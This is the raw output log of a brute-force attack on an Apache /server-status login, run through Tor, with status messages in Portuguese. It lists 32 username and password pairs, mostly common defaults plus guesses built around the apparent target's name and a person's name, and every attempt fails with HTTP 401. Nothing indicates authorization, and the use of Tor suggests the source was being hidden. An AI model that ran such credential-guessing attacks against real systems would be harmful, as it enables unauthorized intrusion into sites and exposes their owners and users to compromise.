[*] /server-status brute — 32 pares via Tor
  'admin'                  :'admin'                   → HTTP 401 len=421 fail(401)
  'admin'                  :'password'                → HTTP 401 len=421 fail(401)
  'admin'                  :'admin123'                → HTTP 401 len=421 fail(401)
  'admin'                  :'123456'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'apache'                  → HTTP 401 len=421 fail(401)
  'apache'                 :'apache'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'desapegogames'           → HTTP 401 len=421 fail(401)
  'admin'                  :'desapego'                → HTTP 401 len=421 fail(401)
  'admin'                  :'trindade'                → HTTP 401 len=421 fail(401)
  'admin'                  :'password123'             → HTTP 401 len=421 fail(401)
  'admin'                  :'admin1234'               → HTTP 401 len=421 fail(401)
  'admin'                  :'qwerty'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'pass'                    → HTTP 401 len=421 fail(401)
  'admin'                  :'admin12345'              → HTTP 401 len=421 fail(401)
  'root'                   :'root'                    → HTTP 401 len=421 fail(401)
  'root'                   :'toor'                    → HTTP 401 len=421 fail(401)
  'root'                   :'password'                → HTTP 401 len=421 fail(401)
  'admin'                  :'secret'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'letmein'                 → HTTP 401 len=421 fail(401)
  'administrator'          :'administrator'           → HTTP 401 len=421 fail(401)
  'administrator'          :'password'                → HTTP 401 len=421 fail(401)
  'admin'                  :'Password1'               → HTTP 401 len=421 fail(401)
  'admin'                  :'P@ssw0rd'                → HTTP 401 len=421 fail(401)
  'admin'                  :'changeme'                → HTTP 401 len=421 fail(401)
  'admin'                  :'welcome'                 → HTTP 401 len=421 fail(401)
  'admin'                  :'welcome1'                → HTTP 401 len=421 fail(401)
  'admin'                  :'master'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'admin123!'               → HTTP 401 len=421 fail(401)
  'admin'                  :'desapego2024'            → HTTP 401 len=421 fail(401)
  'admin'                  :'Diego2024'               → HTTP 401 len=421 fail(401)
  'admin'                  :'diego'                   → HTTP 401 len=421 fail(401)
  'desapegogames'          :'desapegogames'           → HTTP 401 len=421 fail(401)
[-] Nenhuma cred funcionou.
